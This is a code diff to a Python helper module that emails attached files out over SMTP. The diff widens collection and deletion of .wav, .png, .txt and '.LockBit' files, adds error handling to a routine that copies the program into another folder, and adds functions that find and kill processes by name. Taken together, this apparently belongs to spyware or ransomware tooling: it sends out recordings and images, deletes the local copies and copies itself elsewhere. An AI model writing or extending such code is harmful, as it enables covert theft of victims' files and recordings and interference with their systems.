@@ -1,13 +1,14 @@
 import dropbox
 import os
+import psutil
 import shutil
 import smtplib
 import subprocess
+
+from email import encoders
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-
 
 def send_mail_with_attachment(
     smtp_server,
@@ -49,7 +50,7 @@ def send_mail_with_attachment(
         session.sendmail(email_sender, email_receiver, text)
         session.quit()
     except Exception as e:
-        print(f"Errore nell'invio dell'email: {e}")
+        print(f"Error sending email: {e}")
         return False
     return True
 
@@ -58,7 +59,12 @@ def get_wav_and_png_files(dest_folder):
     wav_and_png_files = []
     if os.path.exists(dest_folder) and os.path.isdir(dest_folder):
         for filename in os.listdir(dest_folder):
-            if filename.endswith(".wav") or filename.endswith(".png"):
+            if (
+                filename.endswith(".wav")
+                or filename.endswith(".png")
+                or filename.endswith(".txt")
+                or filename.endswith(".LockBit")
+            ):
                 wav_and_png_files.append(filename)
 
     return wav_and_png_files
@@ -67,7 +73,12 @@ def get_wav_and_png_files(dest_folder):
 def delete_wav_and_png_files(dest_folder):
     if os.path.exists(dest_folder) and os.path.isdir(dest_folder):
         for filename in os.listdir(dest_folder):
-            if filename.endswith(".wav") or filename.endswith(".png"):
+            if (
+                filename.endswith(".wav")
+                or filename.endswith(".png")
+                or filename.endswith(".txt")
+                or filename.endswith(".LockBit")
+            ):
                 file_path = os.path.join(dest_folder, filename)
                 os.remove(file_path)
 
@@ -119,10 +130,39 @@ def save_program_in_location(src_file, dest_folder):
         os.makedirs(dest_folder)
 
     dest_file = os.path.join(dest_folder, os.path.basename(src_file))
-    
-    if not os.path.exists(dest_file):
-        shutil.copy(src_file, dest_file)
-    else:
-        print(f"File {dest_file} already exists.")
-    
+
+    try:
+        if not os.path.exists(dest_file):
+            shutil.copy(src_file, dest_file)
+        else:
+            print(f"File {dest_file} already exists.")
+    except Exception as e:
+        print(f"Error copying file {src_file} to folder {dest_file}: {e}")
+
     return dest_file
+
+
+def is_process_running(process_name):
+    count = 0
+    for proc in psutil.process_iter(attrs=["pid", "name"]):
+        if proc.info["name"] == process_name:
+            count += 1
+    return count
+
+
+def stop_process(process_name):
+    for process in psutil.process_iter(["pid", "name"]):
+        if process.info["name"].lower() == process_name.lower():
+            try:
+                print(
+                    f'Terminating process: {process.info["name"]} (PID: {process.info["pid"]})'
+                )
+                process.terminate()
+                process.wait(timeout=5)
+                print(f'Process {process.info["name"]} terminated.')
+                return
+            except Exception as e:
+                print(
+                    f'Process cannot be terminated: {process.info["name"]} (PID: {process.info["pid"]}): {str(e)}'
+                )
+    print(f"Process {process_name} not found.")
